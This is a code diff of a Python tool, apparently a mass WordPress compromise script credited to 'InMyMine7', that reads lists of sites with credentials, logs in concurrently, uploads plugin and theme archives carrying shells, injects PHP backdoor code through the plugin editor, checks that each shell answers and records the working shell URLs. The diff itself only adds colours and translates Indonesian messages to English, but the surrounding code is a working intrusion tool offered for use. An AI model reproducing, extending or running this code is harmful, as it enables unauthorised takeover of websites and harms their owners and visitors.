@@ -10,9 +10,11 @@ from colorama import Fore, init, Style
 
 init(autoreset=True)
 g = Fore.GREEN + Style.BRIGHT
-res = Style.RESET_ALL
+r = Fore.RED + Style.BRIGHT
+y = Fore.YELLOW + Style.BRIGHT
+c = Fore.CYAN + Style.BRIGHT
 wh = Fore.WHITE + Style.BRIGHT
-
+res = Style.RESET_ALL
 
 PLUGIN_FILE = "plugin-inmymine.zip"
 THEME_FILE = "theme-inmymine.zip"
@@ -35,6 +37,7 @@ banner = f"""{g}
 {wh}[{g}+{wh}] github.com/InMyMine7 
 {wh}[{g}+{wh}] t.me/minsepen {res}
 """
+
 def clear():
     os.system("cls" if os.name == "nt" else "clear")
 
@@ -48,7 +51,7 @@ def parse_line(line):
         username, password = creds.split('@', 1)
         return site, username, password
     except Exception as e:
-        print(f"[ERROR] Format error: {line.strip()} ({e})")
+        print(f"{r}[ERROR] Format error: {line.strip()} ({e}){res}")
         return None, None, None
 
 def verify_shell(url):
@@ -58,7 +61,7 @@ def verify_shell(url):
             return True
         return False
     except Exception as e:
-        print(f"[ERROR] Verifikasi shell gagal: {e}")
+        print(f"{r}[ERROR] Shell verification failed: {e}{res}")
         return False
 
 def login(session, site, username, password):
@@ -81,7 +84,7 @@ def login(session, site, username, password):
         response = session.post(site, data=data, timeout=10)
         return "Dashboard" in response.text or "wp-admin" in response.url
     except Exception as e:
-        print(f"[ERROR] Login exception: {e}")
+        print(f"{r}[ERROR] Login exception: {e}{res}")
         return False
 
 def upload_file(session, site, file_path, file_type):
@@ -125,28 +128,28 @@ def upload_file(session, site, file_path, file_type):
             full_url = urljoin(site_base + '/', content_folder + name + '/install.php')
 
             if verify_shell(full_url):
-                print(f"[SUCCESS] {file_type.capitalize()} berhasil di-upload dan aktif di {full_url}")
+                print(f"{g}[SUCCESS] {file_type.capitalize()} successfully uploaded and active at {full_url}{res}")
                 with open(output_file, 'a') as f:
                     f.write(f"{full_url}\n")
                 return True
             else:
-                print(f"[FAILED] {file_type.capitalize()} berhasil di-upload tapi tidak terverifikasi di {full_url}")
+                print(f"{r}[FAILED] {file_type.capitalize()} uploaded but not verified at {full_url}{res}")
                 return False
 
         if "already exists" in response.text:
-            print(f"[INFO] {file_type.capitalize()} sudah terpasang di {site} — tidak ditimpa")
+            print(f"{y}[INFO] {file_type.capitalize()} already installed at {site} — not overwritten{res}")
         else:
-            print(f"[FAILED] Gagal upload {file_type} ke {site}")
+            print(f"{r}[FAILED] Failed to upload {file_type} to {site}{res}")
 
         return False
 
     except Exception as e:
-        print(f"[ERROR] Upload {file_type} error for {site}: {e}")
+        print(f"{r}[ERROR] Upload {file_type} error for {site}: {e}{res}")
         return False
 
 def inject_plugin_editor(session, site):
     try:
-        print(f"[INFO] Inject via plugin editor di {site}...")
+        print(f"{y}[INFO] Injecting via plugin editor at {site}...{res}")
         base_url = site.replace("wp-login.php", "")
         editor_url = base_url + "wp-admin/plugin-editor.php"
 
@@ -155,7 +158,7 @@ def inject_plugin_editor(session, site):
 
         plugin_select = soup.find("select", {"name": "plugin"})
         if not plugin_select:
-            print("[FAILED] Tidak menemukan dropdown plugin")
+            print(f"{r}[FAILED] Plugin dropdown not found{res}")
             return False
 
         plugin_options = plugin_select.find_all("option")
@@ -211,24 +214,24 @@ if ($_GET[''] == ''){
 
             post_resp = session.post(editor_url, data=post_data, timeout=10)
 
-            if "File edited successfully" in post_resp.text or "berhasil diperbarui" in post_resp.text.lower():
+            if "File edited successfully" in post_resp.text:
                 shell_url = f"{base_url}wp-content/plugins/{plugin_slug}/{file_path.split('/')[-1]}"
                 if verify_shell(shell_url):
-                    print(f"[SUCCESS] Plugin berhasil di-inject dan aktif di {shell_url}")
+                    print(f"{g}[SUCCESS] Plugin successfully injected and active at {shell_url}{res}")
                     with open(SUCCESS_PLUGIN, 'a') as f:
                         f.write(f"{shell_url}\n")
                     return True
                 else:
-                    print(f"[FAILED] Plugin berhasil di-inject tapi tidak terverifikasi di {shell_url}")
+                    print(f"{r}[FAILED] Plugin injected but not verified at {shell_url}{res}")
                     return False
             else:
-                print(f"[DEBUG] Gagal inject plugin {plugin_value}")
+                print(f"{r}[DEBUG] Failed to inject plugin {plugin_value}{res}")
 
-        print("[FAILED] Tidak ada plugin yang berhasil diinjeksi")
+        print(f"{r}[FAILED] No plugins successfully injected{res}")
         return False
 
     except Exception as e:
-        print(f"[ERROR] Inject plugin editor error: {e}")
+        print(f"{r}[ERROR] Inject plugin editor error: {e}{res}")
         return False
 
 def process_site(line):
@@ -243,15 +246,15 @@ def process_site(line):
         'X-Target-Site': site_base
     })
 
-    print(f"[INFO] Mencoba login ke {site}...")
+    print(f"{y}[INFO] Attempting to login to {site}...{res}")
 
     if not login(session, site, username, password):
-        print(f"[FAILED] Login gagal ke {site}")
+        print(f"{r}[FAILED] Login failed to {site}{res}")
         with open(FAILED, 'a') as f:
             f.write(f"{site}#login_failed\n")
         return
 
-    print(f"[INFO] Login berhasil ke {site}")
+    print(f"{g}[INFO] Login successful to {site}{res}")
     success = False
 
     # Upload plugin
@@ -275,25 +278,25 @@ def process_site(line):
 def main():
     clear()
     print(banner)
-    input_file = input("Masukkan nama file list URL (contoh: list.txt): ").strip()
-    thread_count = int(input("Masukkan jumlah thread: "))
+    input_file = input(f"{c}Enter the name of the URL list file (e.g., list.txt): {res}").strip()
+    thread_count = int(input(f"{c}Enter the number of threads: {res}"))
 
     if not os.path.exists(input_file):
-        print("File tidak ditemukan.")
+        print(f"{r}File not found.{res}")
         return
 
     with open(input_file, 'r', encoding='utf-8') as f:
         lines = f.readlines()
 
-    print(f"\n🚀 Mulai upload ke {len(lines)} site dengan {thread_count} thread...\n")
+    print(f"{g}\n🚀 Starting upload to {len(lines)} sites with {thread_count} threads...{res}\n")
     start = time.time()
 
     with ThreadPoolExecutor(max_workers=thread_count) as executor:
         executor.map(process_site, lines)
 
     end = time.time()
-    print(f"\n✅ Selesai dalam {end - start:.2f} detik.")
-    print("📄 Hasil disimpan ke plugin.txt, theme.txt, dan failed.txt")
+    print(f"{g}\n✅ Completed in {end - start:.2f} seconds.{res}")
+    print(f"{y}📄 Results saved to plugin.txt, theme.txt, and failed.txt{res}")
 
 if __name__ == "__main__":
     main()
